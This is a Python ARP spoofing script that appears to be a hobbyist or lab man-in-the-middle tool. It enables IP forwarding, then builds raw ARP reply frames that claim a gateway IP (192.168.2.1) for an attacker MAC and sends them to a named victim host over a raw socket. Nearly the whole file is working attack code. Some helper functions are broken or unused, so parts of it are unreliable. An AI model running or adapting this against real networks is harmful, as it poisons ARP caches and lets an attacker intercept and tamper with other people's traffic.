import socket
import struct
import sys

FILE_ip_forward = "/proc/sys/net/ipv4/ip_forward"

args = sys.argv

if '-attackerIP' in args :
    attackerIP =  args[args.index('-attackerIP') + 1]

if '-attackerMAC' in args :
    attackerMAC = bytes(args[args.index('-attackerMAC') + 1],'utf-8')

if '-targetIP' in args :
    targetIP = args[args.index('-targetIP') + 1]

if '-targetMAC' in args :
    targetMAC = bytes(args[args.index('-targetMAC') + 1],'utf-8')

def main():
    checkIPForwarding()

    # Example usage:
    '''
    gateway_ip = ''
    src_mac = b'\x00\x00\x00\x00\x00\x01' # Replace with your own source MAC address
    src_ip = '192.168.1.1' # Replace with your own source IP address
    dst_mac = b'\xff\xff\xff\xff\xff\xff' # Broadcast MAC address
    dst_ip = '192.168.1.100' # Replace with the destination IP address you want to send the ARP response to
    '''
    attackerIP = socket.inet_aton("192.168.1.1")
    attackerMAC = struct.pack("!6s", b'\x00\x0c\x29\x6f\xd6\xee')
    targetIP = socket.inet_aton("192.168.1.100")
    targetMAC = struct.pack("!6s", b'\xff\xff\xff\xff\xff\xff')

    print(attackerIP)
    print(attackerMAC)
    print(targetIP)
    print(targetMAC)
    send_arp_response(attackerMAC, attackerIP, targetMAC, targetIP)

def checkIPForwarding():
    print('[?] Checking if IP forwarding is enabled in "' + FILE_ip_forward + '" ...')
    with open(FILE_ip_forward,'r',encoding='utf-8') as f:
        f_content = f.read()
        if int(f_content) == 1 :
            print('[+] IP forwarding is enabled')
            f.close()
        else:
            f.close()
            print('[!] IP forwarding is disabled')
            answer = input('[?] Do you want to activate IP forwarding ? y/N > ')
            if answer == 'y' or answer == 'Y' :
                enableIPForwading()
            else :
                print('[!] IP forwarding must be enabled to prevent damaging the network. Exiting...')
                sys.exit()

def enableIPForwading():
    print('[+] Enabling IP forwading...')
    with open(FILE_ip_forward,'w') as f:
        f.write('1')
        f.close()
        print('[+] IP forwarding enabled !')

def disableIPForwading():
    print('[+] Disabling IP forwading...')
    with open(FILE_ip_forward,'w') as f:
        f.write('0')
        f.close()
        print('[+] IP forwarding disabled !')

def send_arp_request(src_ip, src_mac, dst_ip, iface):
    # Create a raw socket
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
    s.bind((iface, socket.htons(0x0800)))

    # Resolve the target IP address to its MAC address
    dst_mac = resolve_ip_to_mac(src_ip, dst_ip, iface)

    # Create ARP request
    arp_frame = struct.pack("!6s6s2s2s2s6s4s6s4s", dst_mac, src_mac, b'\x08\x06', b'\x00\x01', b'\x08\x00', b'\x06', b'\x04', src_mac, src_ip, dst_ip)
    s.send(arp_frame)

    s.close()

def resolve_ip_to_mac(src_ip, dst_ip, iface):
    # Send ARP request to resolve IP address to MAC address
    arp_request = create_arp_request(src_ip, dst_ip)
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
    s.bind((iface, socket.htons(0x0800)))
    s.send(arp_request)

    # Wait for ARP response
    s.settimeout(1)
    try:
        data, _ = s.recvfrom(2048)
    except socket.timeout:
        return None

    # Extract target MAC address from ARP response
    arp_response = struct.unpack("!6s6s2s2s2s6s4s6s4s", data[:42])
    target_mac = arp_response[5]

    s.close()
    return target_mac

def create_arp_request(src_ip, dst_ip):
    # Set source and destination MAC address
    src_mac = b'\x00\x0c\x29\x6f\xd6\xee'
    dst_mac = b'\xff\xff\xff\xff\xff\xff'

    # Create ARP request
    arp_frame = struct.pack("!6s6s2s2s2s6s4s6s4s", dst_mac, src_mac, b'\x08\x06', b'\x00\x01', b'\x08\x00', b'\x06', b'\x04', src_mac, src_ip, dst_ip)

def send_arp_response(src_mac, src_ip, dst_mac, dst_ip):
    # Create a raw socket
    try :
        s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
    except PermissionError as e :
        if 'Operation not permitted' in str(e) :
            print('[!] Need admin privilege')
            sys.exit()
    # Bind the socket to a specific network interface
    s.bind(("eth0", socket.htons(0x0800)))

    '''
    # ARP frame structure
    ARP_FRAME = struct.pack("!6s6s2s2s2s6s4s4s",
                             dst_mac,        # Destination MAC address
                             src_mac,        # Source MAC address
                             b'\x08\x06',     # Ethernet frame type (ARP)
                             b'\x00\x01',     # Hardware type (Ethernet)
                             b'\x08\x00',     # Protocol type (IP)
                             b'\x06\x04',     # Hardware address length and protocol address length
                             b'\x00\x02',     # Operation (ARP response)
                             src_mac,        # Sender MAC address
                             src_ip,         # Sender IP address
                             dst_mac,        # Target MAC address
                             dst_ip)         # Target IP address
    '''

    #attckrmac = b'\x00\x0c\x29\x4f\x8e\x76'
    attckrmac = b'\x08\x00\x27\x43\x73\xbc'
    #victimmac =b'\x00\x0C\x29\x2E\x84\x5A'
    victimmac = b'\x94\x65\x9C\x22\xD3\xC8'
    code =b'\x08\x06'
    htype = b'\x00\x01'
    protype = b'\x08\x00'
    hsize = b'\x06'
    psize = b'\x04'
    opcode = b'\x00\x02'
    to_usurp_ip = '192.168.2.1'
    to_usurp_ip = socket.inet_aton ( to_usurp_ip )
    print(type(to_usurp_ip))
    victim_ip = '192.168.2.76'
    victim_ip = socket.inet_aton ( victim_ip )
    print(type(victim_ip))
    padding = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

    ARP_FRAME = victimmac + attckrmac + code + htype + protype + hsize + psize + opcode + attckrmac + to_usurp_ip + victimmac + victim_ip + padding

    # Send the ARP frame
    s.send(ARP_FRAME)



if __name__ == '__main__':
    main()